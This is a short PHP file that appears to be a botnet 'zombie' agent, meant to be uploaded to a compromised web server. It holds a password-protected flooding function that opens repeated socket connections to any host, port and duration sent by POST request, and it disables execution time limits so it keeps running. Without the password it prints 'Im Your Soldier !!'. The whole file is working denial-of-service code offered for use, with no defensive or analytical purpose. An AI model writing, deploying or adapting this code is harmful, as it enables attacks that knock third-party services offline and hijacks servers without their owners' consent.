<?php


//Upload this file to server for zombie access

set_time_limit(0);
ignore_user_abort(TRUE);
ini_set('max_execution_time', 0);

$pass="qRedAction123";
function flooder($type , $host , $port , $time){
		$packets = 0;
        $timeserver = time();
        $max_time = $timeserver+$time;
        for($i=0;$i<65000;$i++){
                $out = '504w';
        }
        while(TRUE){
            if(time() > $max_time){
                    break;
            }
            $fp = fsockopen($type.$host, $port, $errno, $errstr, 5);
            if($fp){
                    fwrite($fp, $out);
                    fclose($fp);
        }
        $packets++;
    }
        return "$packets Packets Sent !";
}

if(isset($_POST['host']) && isset($_POST['port']) && isset($_POST['type']) && isset($_POST['time']) && isset($_POST['pass']) && $_POST['pass']==$pass){
	$type = $_POST['type'];
	$host = $_POST['host'];
	$time = $_POST['time'];
	$port = $_POST['port'];
	echo flooder($type , $host , $port , $time);

}else{
	echo "<b>Im Your Soldier !!</b>";
}
